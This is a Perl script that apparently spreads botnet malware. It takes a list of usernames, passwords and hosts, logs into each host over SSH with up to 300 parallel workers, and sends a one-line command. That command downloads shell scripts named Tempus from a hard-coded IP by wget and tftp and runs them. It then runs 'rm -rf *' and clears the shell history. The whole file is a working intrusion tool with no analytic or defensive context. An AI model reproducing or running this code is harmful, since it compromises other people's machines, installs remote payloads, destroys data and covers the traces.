#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;
open(fh,'<', $ARGV[0]); @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);
}
# make 10 slaves
my $pm = new Parallel::ForkManager(300); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        # fork a slave
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp  cd /run  cd /; wget http://195.133.40.15/Tempus.sh; chmod 777 Tempus.sh; sh Tempus.sh Tempus; tftp 195.133.40.15 -c get Tempustftp1.sh; chmod 777 Tempustftp1.sh; sh Tempustftp1.sh Tempus; tftp -r Tempustftp2.sh -g 195.133.40.15; chmod 777 Tempustftp2.sh; sh Tempustftp2.sh Tempus; rm -rf Tempus.sh Tempustftp1.sh Tempustftp2.sh; rm -rf *;history -c');
                        sleep 10;
                        $channel->close;
                        print "\x1b[1;35m[\x1b[1;36mTed\x1b[1;35m] \x1b[1;36mRaping\x1b[1;35m-> Fishnsnakes  \x1b[1;36m".$newarray[$c]."";
                } else {
                        print "\x1b[90mCan't Authenticate Host $newarray[$c]";
                }
        } else {
                print "\x1b[90mCant Connect To Host $newarray[$c]";
        }
        # exit worker
        $pm->finish;
}
$pm->wait_all_children;